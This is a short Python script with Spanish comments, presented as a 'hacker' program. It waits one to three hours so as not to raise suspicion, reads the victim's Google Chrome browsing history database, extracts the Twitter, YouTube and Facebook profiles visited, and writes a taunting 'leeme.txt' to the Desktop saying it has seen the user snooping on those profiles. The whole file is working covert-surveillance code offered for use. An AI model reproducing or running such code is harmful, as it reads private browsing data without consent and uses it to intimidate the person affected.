import sqlite3
from pathlib import Path
from time import sleep
from random import randrange
import re

HACKER_FILE_NAME = "leeme.txt"


def get_user_path():
     return "{}/".format(Path.home())


def delay_action():
    number_of_hours = randrange(1, 4)
    print("Dormire {} horas.".format(number_of_hours))
    sleep(number_of_hours * 60 * 60)


def create_hacker_file(user_path, profiles_visited):
    with open(user_path + "Desktop/" + HACKER_FILE_NAME, "w") as hacker_file:
        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)


def check_visited_profiles(chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9_]+)$", item[2])
        results_of_youtube = re.findall("https://www.youtube.com/@([A-Za-z0-9_]+)$", item[2])
        results_of_facebook = re.findall("https://www.facebook.com/([A-Za-z0-9_.]+)$", item[2])

        results = []
        results.extend(results_of_twitter)
        results.extend(results_of_youtube)
        results.extend(results_of_facebook)

        for result in results:
            if result and result not in ["notifications", "home"] and result not in profiles_visited:
                profiles_visited.append(result)
    return profiles_visited


def main():
    # Esperamos entre 1-3 horas para no levantar sospechas
    delay_action()

    # Calculamos la ruta del usuario de windows
    user_path = get_user_path()

    # Recogemos su historial de Google Chrome (cuando sea posible)
    chrome_history = get_chrome_history(user_path)

    # Revisamos si ha visitado perfiles
    profiles_visited = check_visited_profiles(chrome_history)
    if profiles_visited:
        # Si hay perfiles visitados, creamos un archivo en el escritorio
        create_hacker_file(user_path, profiles_visited)
    else:
        print("No se encontraron perfiles de redes sociales visitados recientemente.")


if __name__ == "__main__":
    main()
